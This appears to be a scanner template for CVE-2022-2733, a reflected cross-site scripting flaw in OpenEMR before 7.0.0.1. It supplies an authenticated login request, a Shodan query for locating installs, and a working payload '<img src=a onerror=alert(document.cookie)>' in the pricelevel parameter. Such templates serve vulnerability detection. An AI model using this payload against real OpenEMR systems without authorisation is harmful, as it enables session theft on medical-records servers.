id: CVE-2022-2733
info:
  name: Openemr < 7.0.0.1 - Cross-Site Scripting
  author: ctflearner
  description: 'Cross-site Scripting (XSS) - Reflected in GitHub repository openemr/openemr
    prior to 7.0.0.1.

    '
  severity: medium
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute malicious scripts in the context of the victim''s browser, potentially
    leading to session hijacking, defacement, or theft of sensitive information.

    '
  remediation: 'Upgrade Openemr to version 7.0.0.1 or later to mitigate this vulnerability.

    '
  reference:
  - https://huntr.dev/bounties/25b91301-dfb0-4353-a732-e051bbe8420c/
  - https://nvd.nist.gov/vuln/detail/CVE-2022-2733
  - https://github.com/openemr/openemr/commit/59458bc15ab0cb556c521de9d5187167d6f88945
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2022-2733
    cwe-id: CWE-79
    epss-score: 0.00143
    epss-percentile: 0.49164
    cpe: cpe:2.3:a:open-emr:openemr:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 2
    vendor: open-emr
    product: openemr
    shodan-query: title:"OpenEMR"
  tags: cve,cve2022,xss,openemr,authenticated,huntr,open-emr
traps:
- request:
    method: POST
    path: /interface/main/main_screen.php?auth=login&site=default
    headers:
      Origin: '{{RootURL}}'
      Content-Type: application/x-www-form-urlencoded
      Referer: '{{RootURL}}/interface/login/login.php?site=default'
    body: 'new_login_session_management=1&languageChoice=1&authUser={{username}}&clearPass={{password}}&languageChoice=1

      '
  response:
    status_code: 200
    headers: {}
    body: <img src=a onerror=alert(document.cookie)>pricelevel
- request:
    method: GET
    path: /interface/forms/fee_sheet/review/fee_sheet_options_ajax.php?pricelevel=%3Cimg%20src=a%20onerror=alert(document.cookie)%3E
    headers: {}
    body: ''
  response:
    status_code: 200
    headers: {}
    body: ''
